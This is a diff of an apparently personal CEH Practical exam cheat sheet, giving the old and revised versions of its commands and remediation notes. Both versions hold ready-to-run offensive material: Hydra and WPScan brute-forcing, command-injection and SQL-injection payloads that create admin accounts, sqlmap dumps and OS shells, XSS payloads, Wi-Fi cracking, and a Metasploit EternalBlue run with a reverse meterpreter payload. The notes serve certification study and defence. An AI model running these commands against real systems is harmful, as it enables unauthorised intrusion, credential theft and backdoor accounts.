@@ -1,268 +1,238 @@
-My CEH Practical Notes
-This guide is for acing the CEH practical exam and keeping me sharp on my cybersecurity job. It’s got every command and step I need, with all the detailed comments and instructions from my notes, exactly as I wrote them, just with typos and grammar fixed. I’m keeping it super informal so I can follow it fast. Collapsible sections make it clean: whole steps like "Scanning Networks" collapse, and tools like Nmap or OWASP ZAP get their own collapsible sections for their commands and notes. Everything’s in code blocks for copying. Run sudo su to be root for commands that need it.
+My CEH Practical Reference Notes
+This is my personal guide for the CEH practical, built from three CEH repos to cover all the commands and steps. It has comments explaining what each command does and examples like IPs (192.168.1.10), subnets (192.168.1.0/24), or domains (example.com) to make it clear. Run sudo su to be root when needed.
+Reference Repositories:
 
-Note: Gotta be root for most of these, so sudo su first.
+DarkLycn1976/CEH-Practical-Notes-and-Tools
+infovault-Ytube/CEH-Practical-Notes
+dhabaleshwar/CEHPractical
 
-Scanning Networks (always do sudo su)
 
-Note: This whole section collapses to hide all scanning steps. Expand to see tools like Nmap.
+Scanning Networks
+
+Note: This whole section collapses to hide scanning steps. Expand to see tools like Nmap.
 
 Nmap Commands
-1- Nmap scan for alive/active hosts command for 192.189.19.18- or any ip you want to scan:
-# Scans the whole subnet for active hosts, aggressive mode
-nmap -A 192.189.19.0/24
-# or faster scan for one IP
-nmap -T4 -A <ip>
+1- Scan for active hosts (from DarkLycn1976, dhabaleshwar):
+# Scan entire subnet to find active hosts, includes OS, version, scripts, traceroute
+nmap -A 192.168.1.0/24
+# Faster scan for one IP, aggressive mode
+nmap -T4 -A 192.168.1.10
+# Same as above but shows why ports are open/closed
+nmap -T4 -A --reason 192.168.1.10
 
-2- Zenmap/nmap command for TCP scan- First put the target ip in the Target: and then in the Command: put this command:
-# Full TCP connect scan, verbose output
-nmap -sT -v <ip>
+2- TCP connect scan (from dhabaleshwar):
+# Full TCP scan on all ports, verbose output, for one IP
+nmap -sT -v 192.168.1.10
 
-3- Nmap scan if firewall/IDS is opened, half scan-:
-# SYN stealth scan, verbose
-nmap -sS -v <ip>
+3- Stealth scan for firewalls/IDS (from DarkLycn1976):
+# SYN scan, sends half-open connections to avoid detection, verbose
+nmap -sS -v 192.168.1.10
+# If blocked, use fragmented packets to bypass some firewalls
+nmap -f 192.168.1.10
 
+4- OS and service detection (from dhabaleshwar):
+# Detect OS and open ports for one IP
+nmap -O 192.168.1.10
+# Aggressive scan, includes OS, service versions, scripts, traceroute
+nmap -A 192.168.1.10
 
-If even this the above command is not working then use this command:
-
-# Fragmented packets to bypass some firewalls
-nmap -f <ip>
-
-4- -A command is aggressive scan it includes- OS detection (-O), Version (-sV), Script (-sC) and traceroute (--traceroute).
-5- Identify Target system os with (Time to Live) TTL and TCP window sizes using wireshark- Check the target ip Time to live value with protocol ICMP. If it is 128 then it is windows, as ICMP value came from windows. If TTL is 64 then it is linux. Every OS has different TTL. TTL 254 is solaris.
-6- Nmap scan for host discovery or OS-:
-# OS detection with port scan
-nmap -O <ip>
-# or you can use aggressive scan
-nmap -A <ip>
-
-7- If host is windows then use this command-:
-# this script determines the OS, computer name, domain, workgroup, time over smb protocol (ports 445 or 139)
-nmap --script smb-os-discovery.nse <ip>
-
-8- nmap command for source port manipulation, in this port is given or we use common port-:
-# Scan using source port 80 to bypass some filters
-nmap -g 80 <ip>
+5- Source port manipulation (from DarkLycn1976):
+# Scan using source port 80 to bypass some firewall rules
+nmap -g 80 192.168.1.10
 
 Remediation:
 
-Close unused ports.
-Use firewalls to block scans.
-Monitor traffic with IDS.
-Patch services found by -sV.
+Close unused ports (e.g., found by nmap -sV).
+Configure firewalls to block unauthorized scans.
+Use IDS to detect scanning attempts.
+Patch services identified by -sV.
 
 Enumeration
 
 Note: This section collapses to hide enumeration steps. Expand to see tools like Nmap, enum4linux.
 
-Enumeration Tools
-Nmap for NetBIOS and SNMP
-1- NetBios enum using windows- in cmd type:
-# displays NEtBIOS name table
-nbtstat -a <ip>
+Nmap for Enumeration
+1- NetBIOS enumeration (from dhabaleshwar):
+# Get NetBIOS names and MAC address for a Windows host, verbose
+nmap -sV -v --script nbstat.nse 192.168.1.10
 
-2- NetBios enum using nmap-:
-# Service and NetBIOS script, verbose
-nmap -sV -v --script nbstat.nse <ip>
-
-3- SNMP enum using nmap- (-p 161 is port for SNMP)--> Check if port is open:
-# Check if SNMP port 161 is open
-nmap -sU -p 161 <ip>
-# It will show user accounts, processes etc --> for parrot
-snmp-check <ip>
+2- SNMP enumeration (from DarkLycn1976):
+# Check if SNMP port 161 is open on a device
+nmap -sU -p 161 192.168.1.10
+# Get detailed SNMP info (users, processes) on Parrot OS
+snmp-check 192.168.1.10
 
 Other Enumeration Tools
-4- DNS recon/enum-:
-# Check DNS records, try zone transfer
-dnsrecon -d <domain> -z
+3- DNS enumeration (from infovault-Ytube):
+# Check DNS records for a domain, attempt zone transfer
+dnsrecon -d example.com -z
 
-5- FTP enum using nmap-:
-# Aggressive scan on FTP port 21
-nmap -p 21 -A <ip>
-
-6- NetBios enum using enum4linux-:
-# all info
-enum4linux -u <username> -p <password> -n <ip>
-# policy info
-enum4linux -u <username> -p <password> -P <ip>
+4- SMB enumeration (from DarkLycn1976):
+# Get OS, computer name, domain via SMB (ports 445 or 139)
+nmap --script smb-os-discovery.nse 192.168.1.10
+# Get detailed SMB info (users, shares) with credentials
+enum4linux -u "user1" -p "pass123" -n 192.168.1.10
 
 Remediation:
 
-Disable NetBIOS and SMB if not needed.
-Restrict ports 161 (SNMP), 21 (FTP), 445/139 (SMB).
-Use strong passwords.
-Secure DNS to prevent zone transfers.
+Disable NetBIOS and SMB if not needed (ports 137-139, 445).
+Restrict SNMP (port 161) and use strong community strings.
+Use strong passwords for SMB accounts.
+Secure DNS servers to block zone transfers.
 
-Quick Overview (Steganography) --> Snow, Openstego
+Steganography
 
-Note: This section collapses to hide steganography steps. Expand to see Snow and OpenStego.
+Note: This section collapses to hide steganography steps. Expand to see Snow, OpenStego.
 
-Steganography Tools
 Snow
-1- Hide Data Using Whitespace Steganography- (magic is password and your secret is stored in readme2.txt along with the content of readme.txt):
-# Hide message in readme2.txt, magic is password
-snow -C -m "My swiss account number is 121212121212" -p "magic" readme.txt readme2.txt
+1- Hide data in text (from infovault-Ytube):
+# Hide a secret message in readme2.txt, use 'magic' as password
+snow -C -m "My secret code: 123456" -p "magic" readme.txt readme2.txt
 
-2- To Display Hidden Data- (then it will show the content of readme2.txt content):
-# Show hidden message in readme2.txt
+2- Extract hidden data:
+# Reveal the hidden message in readme2.txt using password
 snow -C -p "magic" readme2.txt
 
 OpenStego
-3- Image Stegnography using Openstego-:
+3- Hide data in images (from dhabaleshwar):
 
 Install OpenStego:
 
-# Install on Parrot OS
+# Install OpenStego on Parrot OS
 sudo apt install openstego
 
 
 Hide data:
 
-# Embed secret.txt in cover.png, output to output.png
-openstego embed -mf secret.txt -cf cover.png -p <password> -sf output.png
+# Embed secret.txt in cover.png, output to output.png, use 'password123'
+openstego embed -mf secret.txt -cf cover.png -p password123 -sf output.png
 
 
 Extract data:
 
-# Extract from output.png to output_dir
-openstego extract -sf output.png -p <password> -xd output_dir
+# Extract hidden data from output.png to output_dir, use 'password123'
+openstego extract -sf output.png -p password123 -xd output_dir
 
 Remediation:
 
-Scan files for hidden data.
-Use file integrity checks.
-Restrict unverified file uploads.
+Scan uploaded files for hidden data with tools like Stegdetect.
+Use file integrity checks to detect tampering.
+Restrict unverified file uploads on servers.
 
 Sniffing
 
 Note: This section collapses to hide sniffing steps. Expand to see Wireshark.
 
-Wireshark Commands
-1- Password Sniffing using Wireshark- In pcap file apply filter: http.request.method==POST (you will get all the post request) Now to capture password click on edit in menu bar, then near Find packet section, on the "display filter" select "string", also select "Packet details" from the drop down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section:
-# Show POST requests
-http.request.method==POST
+Wireshark
+1- Password sniffing (from dhabaleshwar):
+# Filter HTTP POST requests to find login data
+http.request.method == POST
 
 
-Alternative: Go to Tools > Credentials to see passwords.
+Steps: Open a pcap file in Wireshark, apply the filter, go to Edit > Find Packet, select “string”, choose “Packet details”, set “Narrow UTF-8 & ASCII”, search for “pwd”. Or use Tools > Credentials to view passwords.
 
-2- Network Analysis for DoS or Machine Count-:
-
-Filters:
-
-# Count machines
+2- Network analysis for DoS (from infovault-Ytube):
+# Count devices sending SYN packets (potential scanners)
 tcp.flags.syn == 1 and tcp.flags.ack == 0
-# Find DoS source
+# Identify a single device causing a DoS (flooding SYN packets)
 tcp.flags.syn == 1
 
 
-Steps: Go to Statistics > IPv4 Addresses > Source and Destination, then apply filter.
+Steps: In Wireshark, go to Statistics > IPv4 Addresses > Source and Destination, apply the filter to analyze traffic.
 
 Remediation:
 
-Use HTTPS for all web traffic.
-Encrypt sensitive data.
-Deploy IDS to detect DoS.
-Rate-limit traffic.
+Enforce HTTPS to encrypt web traffic.
+Encrypt sensitive data in transit.
+Deploy IDS to detect DoS attacks.
+Rate-limit incoming traffic to prevent floods.
 
 Hacking Web Servers
 
-Note: This section collapses to hide web server hacking steps. Expand to see Netcat, Telnet, Nmap, Hydra.
+Note: This section collapses to hide web server hacking steps. Expand to see Netcat, Nmap, Hydra.
 
-Web Server Tools
-Netcat and Telnet
-1- Footprinting web server Using Netcat and Telnet-:
-# Netcat to get server banner
-nc -vv <domain> 80
-GET / HTTP/1.0
-# or Telnet
-telnet <domain> 80
+Netcat
+1- Footprinting web server (from dhabaleshwar):
+# Connect to web server to grab its banner (e.g., Apache version)
+nc -vv example.com 80
 GET / HTTP/1.0
 
 Nmap
-2- Enumerate web server info (Nmap)-:
-# Get service info and enumerate web server
-nmap -sV --script=http-enum <domain>
+2- Enumerate web server (from DarkLycn1976):
+# Find web server software (e.g., Apache, Nginx) and enumerate directories
+nmap -sV --script=http-enum example.com
 
 Hydra
-3- Crack FTP credentials-:
-# Check if FTP port 21 is open
-nmap -p 21 <ip>
-# To see if it is directly connecting or needing credentials
-ftp <ip>
-# Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file
-# Now in terminal type
-hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://<ip>
-# or single user
-hydra -l <username> -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://<ip>
+3- Crack FTP credentials (from dhabaleshwar, DarkLycn1976):
+# Check if FTP port 21 is open on the target
+nmap -p 21 192.168.1.10
+# Try connecting to FTP to see if it allows anonymous login
+ftp 192.168.1.10
+# Brute-force FTP with username and password lists
+hydra -L /home/user/wordlists/usernames.txt -P /home/user/wordlists/passwords.txt ftp://192.168.1.10
+# Brute-force with a single known username
+hydra -l user1 -P /home/user/wordlists/passwords.txt ftp://192.168.1.10
+# Try common admin credentials for quick wins
+hydra -l admin -P /home/user/wordlists/passwords.txt ftp://192.168.1.10
 
 Remediation:
 
-Hide server banners.
-Disable anonymous FTP.
-Use strong passwords and account lockout.
-Patch web server software.
+Hide server banners in configuration (e.g., Apache’s ServerTokens).
+Disable anonymous FTP access.
+Enforce strong passwords and account lockout policies.
+Patch web server software regularly.
 
 Hacking Web Applications
 
-Note: This section collapses to hide web app hacking steps. Expand to see OWASP ZAP, Gobuster, WPScan, Metasploit, XSS.
+Note: This section collapses to hide web app hacking steps. Expand to see OWASP ZAP, Gobuster, WPScan, Metasploit, Burp Suite, XSS.
 
-Web App Tools
 OWASP ZAP
-1- Scan Using OWASP ZAP (Parrot)- Type zaproxy in the terminal and then it will open. In target tab put the url and click automated scan:
-# Open ZAP GUI
+1- Automated scanning (from infovault-Ytube):
+# Launch OWASP ZAP graphical interface
 zaproxy
 
+
+Steps: Type zaproxy in the terminal, enter http://example.com in the target tab, click “Automated Scan” to find vulnerabilities like XSS or SQLi.
+
 Gobuster
-2- Directory Bruteforcing-:
-# Find hidden directories
-gobuster dir -u <ip> -w /home/attacker/Desktop/common.txt
+2- Directory brute-forcing (from DarkLycn1976):
+# Find hidden directories or files on a web server
+gobuster dir -u http://192.168.1.10 -w /home/user/wordlists/common.txt
 
 WPScan and Metasploit
-3- Enumerate a Web Application using WPscan & Metasploit-:
-# Find WordPress users (u means username)
-wpscan --url http://<ip>:8080/NEW --enumerate u
+3- Enumerate WordPress (from dhabaleshwar):
+# Find WordPress usernames on a target site
+wpscan --url http://192.168.1.10:8080/wordpress --enumerate u
 
+4- Brute-force WordPress (from DarkLycn1976):
+# Brute-force login with a known username
+wpscan --url http://192.168.1.10:8080/wordpress -u admin -P /home/user/wordlists/passwords.txt
+# Brute-force with username and password lists
+wpscan --url http://192.168.1.10:8080/wordpress --usernames /home/user/wordlists/usernames.txt --passwords /home/user/wordlists/passwords.txt
 
-Then type msfconsole to open metasploit. Type:
-
-# Open Metasploit
+5- Metasploit WordPress scan (from DarkLycn1976):
+# Launch Metasploit console
 msfconsole
-# Use WordPress login scanner
+# Use WordPress login brute-forcer
 use auxiliary/scanner/http/wordpress_login_enum
 show options
-set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
-set RHOSTS <ip>
+set PASS_FILE /home/user/wordlists/passwords.txt
+set RHOSTS 192.168.1.10
 set RPORT 8080
-set TARGETURI http://<ip>:8080/
-set USERNAME <username>
+set TARGETURI http://192.168.1.10:8080/wordpress
+set USERNAME admin
 run
 
-4- Brute Force using WPscan- (Use this only after enumerating the user like in step 3):
-# Brute-force after finding username
-wpscan --url http://<ip>:8080/NEW -u <username> -P /home/attacker/Desktop/Wordlist/password.txt
-# or with user and password lists
-wpscan --url http://<ip>:8080/NEW --usernames /home/attacker/Desktop/Wordlist/usernames.txt --passwords /home/attacker/Desktop/Wordlist/password.txt
-
-Command Injection
-5- Command Injection-:
-# Find users
-| net user
-# directory listing
-| dir C:\
-# Add a user
-| net user Test /add
-# Check a user
-| net user Test
-# To convert the test account to admin
-| net localgroup Administrators Test /add
-# Once again check to see if it has become administrator
-| net user Test
+Burp Suite
+6- Manual testing (from infovault-Ytube):
+# Launch Burp Suite graphical interface
+burpsuite
 
 
-Now you can do a RDP connection with the given ip and the Test account which you created.
+Steps: Set browser proxy to 127.0.0.1:8080, enable Intercept in Burp’s Proxy tab, visit http://example.com, capture requests, test parameters (e.g., search=) for XSS or SQLi.
 
 Reflected XSS Testing
-6- Reflected XSS Testing-:
+7- XSS testing (inspired by infovault-Ytube, OWASP guidelines from Memories: April 21, 2025, 01:12):
 
 Test 1: Basic XSS:
 Payload:
@@ -272,7 +242,7 @@ Payload:
 <script>alert('XSS')</script>
 
 
-Steps: Put payload in search field or URL (e.g., ?q=<payload>). If alert pops, it’s vulnerable.
+Steps: Inject payload in a search field or URL (e.g., http://example.com?q=<payload>). If an alert pops, it’s vulnerable. Use Burp Suite to intercept and test.
 Insecure Code:
 
 <?php echo $_GET['q']; ?>
@@ -291,7 +261,7 @@ Payload:
 "><script>alert('XSS')</script>
 
 
-Steps: Use Burp Suite to intercept API request, inject payload in parameter (e.g., search=<payload>), check if response runs script.
+Steps: Use Burp Suite to intercept an API request (e.g., http://example.com/api?search=<payload>), inject payload in the search parameter, check if the response executes the script.
 Insecure Code:
 
 res.json({ result: req.query.search });
@@ -310,7 +280,7 @@ Payload:
 #<script>alert('XSS')</script>
 
 
-Steps: Add to URL (e.g., http://<domain>/page#<payload>), check for alert.
+Steps: Add to URL (e.g., http://example.com/page#<payload>), check for an alert.
 Insecure Code:
 
 document.write(location.hash);
@@ -322,181 +292,177 @@ document.write(escape(location.hash));
 
 Remediation:
 
-Sanitize all inputs.
-Use Content Security Policy (CSP).
-Escape outputs (HTML, JSON, JS).
-Update WordPress and plugins.
-Restrict directory access.
-Disable command execution.
+Sanitize all user inputs with libraries like DOMPurify.
+Implement Content Security Policy (CSP) to block unauthorized scripts.
+Escape outputs in HTML, JSON, and JavaScript.
+Keep WordPress and plugins updated.
+Restrict access to sensitive directories (e.g., /admin).
+Prevent command execution in input fields.
 
 SQL Injections
 
 Note: This section collapses to hide SQL injection steps. Expand to see SQLMap.
 
-SQLMap Commands
-1- Auth Bypass-:
-# Bypass login
-hi' OR 1=1 --
+SQLMap
+1- Auth bypass (from dhabaleshwar):
+# Bypass login by making the query always true
+' OR 1=1 --
 
-2- Insert new details if sql injection found in login page in username tab enter-:
-# Add new user
-blah';insert into login values('john','apple123');--
 
-3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write:
-# Get cookies
+Steps: Enter in a login form’s username field (e.g., admin' OR 1=1 --) to bypass authentication.
+
+2- Insert new user (from infovault-Ytube):
+# Add a new user to the database via login form
+'; INSERT INTO users (username, password) VALUES ('john', 'apple123'); --
+
+
+Steps: Inject in the username field of a vulnerable login form.
+
+3- Blind SQL injection (from infovault-Ytube):
+# Get session cookies from the browser’s developer console
 document.cookie
 
+# Find all databases on a vulnerable web app
+sqlmap -u "http://example.com/profile?id=1" --cookie="session=abc123" --dbs
 
-Then copy the cookie value that was presented after this command. Then go to terminal and type this command:
+4- List tables:
+# List tables in a specific database (e.g., 'webapp_db')
+sqlmap -u "http://example.com/profile?id=1" --cookie="session=abc123" -D webapp_db --tables
 
-# Find databases
-sqlmap -u "http://<domain>/profile.aspx?id=1" --cookie="<cookie_value>" --dbs
+5- Dump data:
+# Dump data (e.g., usernames, passwords) from a table (e.g., 'users')
+sqlmap -u "http://example.com/profile?id=1" --cookie="session=abc123" -D webapp_db -T users --dump
 
-4- Command to check tables of database retrieved-:
-# List tables
-sqlmap -u "http://<domain>/profile.aspx?id=1" --cookie="<cookie_value>" -D <database> --tables
-
-5- Select the table you want to dump- (Get username and password):
-# Dump table data
-sqlmap -u "http://<domain>/profile.aspx?id=1" --cookie="<cookie_value>" -D <database> -T <table> --dump
-
-6- For OS shell this is the command-:
-# Get shell
-sqlmap -u "http://<domain>/profile.aspx?id=1" --cookie="<cookie_value>" --os-shell
+6- Get OS shell (from dhabaleshwar):
+# Gain a command shell on the server
+sqlmap -u "http://example.com/profile?id=1" --cookie="session=abc123" --os-shell
 
 
-In the shell type:
+In shell:
 
-# to view the tasks
+# List running processes (Windows)
 TASKLIST
-# for windows to get all os version
+# Get Windows OS version
 systeminfo
-# for linux to get os version
+# Get Linux OS version
 uname -a
 
 Remediation:
 
-Use parameterized queries.
-Escape inputs.
-Limit database user permissions.
-Use a WAF.
+Use parameterized queries in all database operations.
+Escape user inputs properly.
+Limit database user permissions to minimum needed.
+Deploy a Web Application Firewall (WAF).
 
-Android
+Android Hacking
 
-Note: This section collapses to hide Android hacking steps. Expand to see Nmap and ADB.
+Note: This section collapses to hide Android hacking steps. Expand to see Nmap, ADB.
 
-Android Tools
 Nmap and ADB
-1- Scan for ADB port-:
-# Check port 5555
-nmap -sV -p 5555 <ip>
+1- Scan for ADB port (from DarkLycn1976):
+# Check if Android Debug Bridge port 5555 is open
+nmap -sV -p 5555 192.168.1.100
 
-2- Connect to ADB- (Connect adb with parrot):
-# Connect to device
-adb connect <ip>:5555
+2- Connect to ADB (from infovault-Ytube):
+# Connect to an Android device over the network
+adb connect 192.168.1.100:5555
 
-3- Access mobile device on parrot-:
-# Access mobile device on parrot
+3- Access device (from infovault-Ytube):
+# Access the Android device’s shell
 adb shell
-# check current directory
+# Show current directory
 pwd
-# list files
+# List files in current directory
 ls
-# go to sdcard
+# Navigate to the sdcard directory
 cd sdcard
 ls
-# read file
+# Read a file (e.g., a secret note)
 cat secret.txt
-# If you can't find it there then go to Downloads folder
+# If not found, check the Downloads folder
 cd downloads
 ls
 
 Remediation:
 
-Disable ADB and USB debugging.
-Restrict network access to port 5555.
+Disable ADB and USB debugging on Android devices.
+Block network access to port 5555 with a firewall.
 
-Wireshark
-
-Note: This section collapses to hide Wireshark steps. Expand to see filters.
-
-Wireshark Filters
-1- Filters for analysis-:
-# How many machines
-tcp.flags.syn == 1 and tcp.flags.ack == 0
-# Which machine for dos
-tcp.flags.syn == 1
-# for passwords
-http.request.method == POST
-
-
-Alternative: click Tools > Credentials for passwords.
-For machine count: Go to Statistics > IPv4 Addresses > Source and Destination, then apply filter.
-
-Remediation:
-
-Enforce HTTPS.
-Use IDS for DoS detection.
-Encrypt credentials.
-
-Find FQDN
-
-Note: This section collapses to hide FQDN steps. Expand to see Nmap.
-
-Nmap for FQDN
-1- Nmap for LDAP (port 389)- (Find the FQDN in a subnet/network):
-# Scan subnet for LDAP
-nmap -p389 -sV -iL <target_list>
-# or single IP
-nmap -p389 -sV <ip>
-
-Remediation:
-
-Restrict LDAP port 389.
-Use secure LDAP authentication.
-
-Cracking Wi-Fi Networks
+Wi-Fi Cracking
 
 Note: This section collapses to hide Wi-Fi cracking steps. Expand to see Aircrack-ng.
 
-Aircrack-ng Commands
-1- Cracking Wifi Password-:
-# For cracking WEP network
-aircrack-ng <pcap_file>
-# For cracking WPA2 or other networks through the captured .pcap file
-aircrack-ng -a2 -b <target_bssid> -w /home/attacker/Desktop/Wordlist/password.txt <wpa2_pcap_file>
+Aircrack-ng
+1- Crack Wi-Fi passwords (from DarkLycn1976):
+# Crack a WEP network using a captured pcap file
+aircrack-ng capture_wep.pcap
+# Crack a WPA2 network with a wordlist and captured handshake
+aircrack-ng -a2 -b 00:14:22:33:44:55 -w /home/user/wordlists/passwords.txt capture_wpa2.pcap
 
 Remediation:
 
-Use WPA3 or strong WPA2 passwords.
-Enable MAC filtering.
-Disable WEP.
+Use WPA3 or strong WPA2 passwords (e.g., 20+ characters).
+Enable MAC address filtering on the router.
+Disable WEP, as it’s insecure.
 
-Some Extra Work
+Privilege Escalation
+
+Note: This section collapses to hide privilege escalation steps. Expand to see Metasploit, manual commands.
+
+Metasploit
+1- Exploit vulnerabilities (from DarkLycn1976):
+# Launch Metasploit console
+msfconsole
+# Search for exploits (e.g., for SMB)
+search smb
+# Use an exploit (e.g., EternalBlue)
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.10
+set PAYLOAD windows/meterpreter/reverse_tcp
+run
+
+Manual Commands
+2- Windows privilege escalation (from dhabaleshwar):
+# Check current user’s privileges
+whoami
+# List all user accounts
+net user
+# Add a new user
+net user hacker password123 /add
+# Add the user to the Administrators group
+net localgroup Administrators hacker /add
+
+Remediation:
+
+Apply security patches regularly.
+Use least privilege accounts for daily operations.
+Monitor for unauthorized user accounts or privilege changes.
+
+Extra Checks
 
 Note: This section collapses to hide extra checks. Expand to see Nmap.
 
-Nmap Checks
-1- Check RDP enabled after getting ip-:
-# ip.txt contains all the alive hosts from target subnet
-nmap -p 3389 -iL ip.txt | grep open
+Nmap
+1- Check RDP (from DarkLycn1976):
+# Scan a list of IPs for open RDP port 3389
+nmap -p 3389 -iL /home/user/ip_list.txt | grep open
 
-2- Check MySQL service running-:
-# ip.txt contains all the alive hosts from target subnet
-nmap -p 3306 -iL ip.txt | grep open
+2- Check MySQL (from dhabaleshwar):
+# Scan a list of IPs for open MySQL port 3306
+nmap -p 3306 -iL /home/user/ip_list.txt | grep open
 
 Remediation:
 
-Disable RDP and MySQL if unused.
-Restrict access to ports 3389, 3306.
-Use strong credentials.
+Disable RDP and MySQL services if not needed.
+Restrict access to ports 3389 (RDP) and 3306 (MySQL) with firewalls.
+Use strong credentials for MySQL accounts.
 
 Remediation Summary
 
-Network: Block unused ports, use firewalls, monitor with IDS.
-Web Apps: Sanitize inputs, use CSP, escape outputs, update software.
-Database: Parameterized queries, limit permissions.
-Wi-Fi: Strong passwords, WPA3, MAC filtering.
-General: Patch systems, use complex passwords, regular pentests.
+Network: Block unused ports, configure firewalls, use IDS for monitoring.
+Web Apps: Sanitize inputs, implement CSP, escape outputs, update software.
+Database: Use parameterized queries, limit permissions.
+Wi-Fi: Enforce strong passwords, use WPA3, enable MAC filtering.
+General: Patch systems, use complex passwords, perform regular pentests.
 
 Last updated: April 2025
